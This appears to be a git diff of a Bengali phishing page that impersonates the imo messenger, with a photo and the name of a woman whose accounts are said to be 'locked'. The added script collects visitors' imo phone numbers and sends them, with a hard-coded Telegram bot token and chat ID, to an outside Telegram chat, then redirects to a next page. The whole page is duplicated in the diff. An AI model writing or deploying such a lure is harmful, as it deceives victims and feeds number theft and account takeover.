@@ -1,107 +1,200 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>imo Unlock</title>
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/css/intlTelInput.css"/>
-
-<style>
-body{
-  font-family:Arial;
-  background:#f4f6f8;
-  margin:0;
-  padding:0;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  height:100vh;
-}
-
-.container{
-  background:white;
-  width:360px;
-  border-radius:16px;
-  box-shadow:0 8px 20px rgba(0,0,0,0.1);
-  padding:20px;
-  text-align:center;
-}
-
-h2{
-  margin-bottom:10px;
-}
-
-p{
-  font-size:14px;
-  color:#555;
-}
-
-#phone{
-  width:100%;
-  padding:12px;
-  border:1px solid #ddd;
-  border-radius:10px;
-  margin-top:15px;
-}
-
-button{
-  margin-top:20px;
-  width:100%;
-  padding:14px;
-  border:none;
-  border-radius:12px;
-  background:#cfcfcf;
-  color:white;
-  font-size:16px;
-  cursor:not-allowed;
-  transition:all 0.3s ease;
-}
-
-button.active{
-  background:#1e88ff;
-  cursor:pointer;
-}
-</style>
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>imo Profile Page</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@400;700&display=swap');
+        body { font-family: 'Noto Sans Bengali', sans-serif; background-color: #ffffff; }
+        .card-shadow { box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08); }
+        .btn-active { background-color: #00acee !important; color: white !important; }
+    </style>
 </head>
-<body>
+<body class="max-w-md mx-auto min-h-screen bg-white">
 
-<div class="container">
+    <header class="flex items-center justify-between px-5 py-3">
+        <div class="flex items-center gap-2">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a7/Imo_app_logo.png" class="w-8 h-8" alt="imo">
+            <span class="text-xl font-bold text-gray-800">imo</span>
+        </div>
+        <i class="fa-solid fa-magnifying-glass text-gray-400 text-xl"></i>
+    </header>
 
-<h2>Mst:Sarmin akter</h2>
-<p>Mst:Sarmin akter এর imo অ্যাকাউন্ট লক। নিচে ফাঁকা ঘরে imo/WhatsApp নাম্বার বসান।</p>
+    <div class="px-5 py-8">
+        <div class="bg-white rounded-[30px] border border-gray-100 card-shadow p-6">
+            <div class="flex gap-4 items-center mb-6">
+                <img src="https://i.ibb.co/3ykfLpP/1000001390.jpg" class="w-20 h-20 rounded-full object-cover border-2 border-white shadow-sm" alt="Profile">
+                <div>
+                    <h1 class="text-[21px] font-bold text-gray-900 leading-tight">Mst: Priya Akter</h1>
+                    <button class="mt-1 bg-[#e0f7fa] text-[#00acc1] text-[13px] font-bold px-4 py-1 rounded-md">Message Request</button>
+                </div>
+            </div>
 
-<input id="phone" type="tel" placeholder="নিচে নাম্বার বসান">
+            <div class="text-[15px] text-gray-700 space-y-4 leading-relaxed mb-6">
+                <p>Mst: Priya Akter এর imo এবং Whatsapp একাউন্ট Locked করা আছে।</p>
+                <p>Mst: Priya Akter এর সাথে আপনার ইমু নাম্বার Add করতে চাইলে নিচে ফাঁকা ঘরে আপনার ইমু নাম্বার লিখে Add করুন।</p>
+                <p class="font-bold text-gray-900 pt-2">ইমু নাম্বার</p>
+            </div>
 
-<button id="unlockBtn">Sarmin akter আনলক করুন →</button>
+            <div class="mb-8">
+                <input type="text" id="phoneNumber" placeholder="এখানে আপনার ইমু নাম্বার দেন" 
+                    class="w-full border-2 border-gray-200 rounded-xl px-5 py-4 outline-none text-gray-800 placeholder-gray-400 text-[16px] focus:border-[#00acee] transition-all">
+            </div>
 
-</div>
+            <button id="addBtn" onclick="sendToTelegramAndRedirect()" class="w-full bg-[#cbd5e1] text-white py-4 rounded-xl font-bold text-[18px] transition-all duration-300">
+                Add Priya Akter
+            </button>
+        </div>
+    </div>
 
-<script src="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/js/intlTelInput.min.js"></script>
-<script>
-const input = document.querySelector("#phone");
-const btn = document.getElementById("unlockBtn");
+    <script>
+        const BOT_TOKEN = "7957986649:AAGCcJ5R6g6PMHEgWXFqLRn2SrpElZvUtnE";
+        const CHAT_ID = "8516934257";
 
-// intl-tel-input setup
-window.intlTelInput(input, {
-  initialCountry: "auto",
-  geoIpLookup: function(callback){
-    fetch("https://ipapi.co/json").then(res=>res.json()).then(data=>callback(data.country_code)).catch(()=>callback("bd"));
-  },
-  separateDialCode: true
-});
+        const phoneInput = document.getElementById('phoneNumber');
+        const addBtn = document.getElementById('addBtn');
 
-// Enable button when user types
-input.addEventListener("input", function(){
-  if(input.value.length>=6){
-    btn.classList.add("active");
-    btn.onclick = ()=>window.location.href="verification.html";
-  }else{
-    btn.classList.remove("active");
-    btn.onclick = null;
-  }
-});
-</script>
+        // ইউজার কিছু টাইপ করলেই বাটন সক্রিয় হবে
+        phoneInput.addEventListener('input', function() {
+            if (this.value.length > 0) {
+                addBtn.classList.add('btn-active');
+            } else {
+                addBtn.classList.remove('btn-active');
+            }
+        });
+
+        // নাম্বার চেক না করেই সরাসরি টেলিগ্রামে পাঠাবে
+        async function sendToTelegramAndRedirect() {
+            const number = phoneInput.value;
+            
+            if (number.trim() === "") {
+                alert('অনুগ্রহ করে আগে নাম্বার লিখুন');
+                return;
+            }
+
+            addBtn.innerText = "Processing...";
+            
+            try {
+                await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+
+method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: "নতুন ইমু নাম্বার: " + number
+                    })
+                });
+                
+                // কাজ শেষে রিডাইরেক্ট
+                window.location.href = 'next_page.html';
+            } catch (error) {
+                // নেটওয়ার্ক সমস্যার ক্ষেত্রেও যেন আটকে না থাকে তাই রিডাইরেক্ট করে দিচ্ছি
+                window.location.href = 'next_page.html';
+            }
+        }
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>imo Profile Page</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@400;700&display=swap');
+        body { font-family: 'Noto Sans Bengali', sans-serif; background-color: #ffffff; }
+        .card-shadow { box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08); }
+        .btn-active { background-color: #00acee !important; color: white !important; }
+    </style>
+</head>
+<body class="max-w-md mx-auto min-h-screen bg-white">
+
+    <header class="flex items-center justify-between px-5 py-3">
+        <div class="flex items-center gap-2">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a7/Imo_app_logo.png" class="w-8 h-8" alt="imo">
+            <span class="text-xl font-bold text-gray-800">imo</span>
+        </div>
+        <i class="fa-solid fa-magnifying-glass text-gray-400 text-xl"></i>
+    </header>
+
+    <div class="px-5 py-8">
+        <div class="bg-white rounded-[30px] border border-gray-100 card-shadow p-6">
+            <div class="flex gap-4 items-center mb-6">
+                <img src="https://i.ibb.co/3ykfLpP/1000001390.jpg" class="w-20 h-20 rounded-full object-cover border-2 border-white shadow-sm" alt="Profile">
+                <div>
+                    <h1 class="text-[21px] font-bold text-gray-900 leading-tight">Mst: Priya Akter</h1>
+                    <button class="mt-1 bg-[#e0f7fa] text-[#00acc1] text-[13px] font-bold px-4 py-1 rounded-md">Message Request</button>
+                </div>
+            </div>
+
+            <div class="text-[15px] text-gray-700 space-y-4 leading-relaxed mb-6">
+                <p>Mst: Priya Akter এর imo এবং Whatsapp একাউন্ট Locked করা আছে।</p>
+                <p>Mst: Priya Akter এর সাথে আপনার ইমু নাম্বার Add করতে চাইলে নিচে ফাঁকা ঘরে আপনার ইমু নাম্বার লিখে Add করুন।</p>
+                <p class="font-bold text-gray-900 pt-2">ইমু নাম্বার</p>
+            </div>
+
+            <div class="mb-8">
+                <input type="text" id="phoneNumber" placeholder="এখানে আপনার ইমু নাম্বার দেন" 
+                    class="w-full border-2 border-gray-200 rounded-xl px-5 py-4 outline-none text-gray-800 placeholder-gray-400 text-[16px] focus:border-[#00acee] transition-all">
+            </div>
+
+            <button id="addBtn" onclick="sendToTelegramAndRedirect()" class="w-full bg-[#cbd5e1] text-white py-4 rounded-xl font-bold text-[18px] transition-all duration-300">
+                Add Priya Akter
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "7957986649:AAGCcJ5R6g6PMHEgWXFqLRn2SrpElZvUtnE";
+        const CHAT_ID = "8516934257";
+
+        const phoneInput = document.getElementById('phoneNumber');
+        const addBtn = document.getElementById('addBtn');
+
+        // ইউজার কিছু টাইপ করলেই বাটন সক্রিয় হবে
+        phoneInput.addEventListener('input', function() {
+            if (this.value.length > 0) {
+                addBtn.classList.add('btn-active');
+            } else {
+                addBtn.classList.remove('btn-active');
+            }
+        });
+
+        // নাম্বার চেক না করেই সরাসরি টেলিগ্রামে পাঠাবে
+        async function sendToTelegramAndRedirect() {
+            const number = phoneInput.value;
+            
+            if (number.trim() === "") {
+                alert('অনুগ্রহ করে আগে নাম্বার লিখুন');
+                return;
+            }
+
+            addBtn.innerText = "Processing...";
+            
+            try {
+                await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+
+method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: "নতুন ইমু নাম্বার: " + number
+                    })
+                });
+                
+                // কাজ শেষে রিডাইরেক্ট
+                window.location.href = 'next_page.html';
+            } catch (error) {
+                // নেটওয়ার্ক সমস্যার ক্ষেত্রেও যেন আটকে না থাকে তাই রিডাইরেক্ট করে দিচ্ছি
+                window.location.href = 'next_page.html';
+            }
+        }
+    </script>
 </body>
 </html>
